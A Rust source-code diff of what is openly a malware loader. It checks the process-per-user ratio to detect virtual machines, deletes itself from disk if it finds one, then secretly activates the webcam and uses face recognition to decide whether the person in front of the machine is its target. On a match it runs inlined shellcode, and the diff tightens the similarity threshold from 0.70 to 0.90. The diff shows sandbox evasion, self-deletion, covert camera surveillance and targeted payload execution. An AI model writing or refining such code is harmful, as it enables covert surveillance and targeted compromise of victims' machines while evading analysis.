@@ -1,6 +1,9 @@
 #![no_main]
+extern crate alloc;
 
-use std::error::Error;
+use alloc::boxed::Box;
+use alloc::vec::Vec;
+use core::error::Error;
 use opencv::prelude::VideoCaptureTrait;
 use opencv::Result;
 
@@ -19,7 +22,6 @@ extern "C" {
     fn DeleteSelfFromDisk() -> bool;
 
 }
-
 #[no_mangle]
 fn main() -> Result<(), Box<dyn Error>> {
     let mut user_count: u32 = 0;
@@ -27,36 +29,37 @@ fn main() -> Result<(), Box<dyn Error>> {
 
     unsafe {
         if !GetProcessCountViaSnapShot(&mut proc_count as *mut u32) {
-            println!("[-] GetProcessCountViaSnapShot failed!");
             return Ok(());
         }
 
         if !GetUniqueUserCountViaSnapshot(&mut user_count as *mut u32) {
-            println!("[-] GetUniqueUserCountViaSnapshot failed!");
             return Ok(());
         }
 
         let proc_per_user_ratio: f32 = (proc_count / user_count) as f32;
 
         if !VmDetection(proc_per_user_ratio){
-            println!("[-] Failed VM check, self-deleting!");
+            println!("[-] VM detected. Self-deleting.");
             DeleteSelfFromDisk(); // We are running in a virtual machine
             return Ok(());
         }
 
-        println!("[+] Bare metal machine detected!")
     }
-
+    println!("[+] Bare metal machine detected.");
     // if we pass the check built by our Decision tree, continue
 
     let mut face_classifier = init_face_classifier()?;
     let mut cam = init_camera()?;
+
+    println!("[+] Camera initialization done.");
 
     let mut frame = opencv::core::Mat::default();
     let mut embeddings = Vec::new();
 
     // Detect faces in the live video feed
     detect_faces(&mut cam, &mut face_classifier, &mut frame, &mut embeddings)?;
+
+    println!("[+] Detected face.");
 
     // Turn camera off
     cam.release().expect("[-] Failed to close camera!");
@@ -67,14 +70,19 @@ fn main() -> Result<(), Box<dyn Error>> {
     // Calculate similarity between embeddings
     let similarity = calculate_similarity(&embeddings)?;
 
-    println!("[i] Similarity: {:#?}", similarity);
+    println!("[+] Similarity score: {:#?}", similarity);
 
-    if similarity > 0.70 {
-        println!("[+] Target verified, deploying shellcode!");
+    if similarity > 0.90 {
+
+        println!("[+] Target detected! Running shellcode...");
 
         unsafe{
             InlinedShellcodeExecution();
         }
+
+    }else{
+
+        println!("[-] Target NOT detected! Trying again later...");
 
     }
 
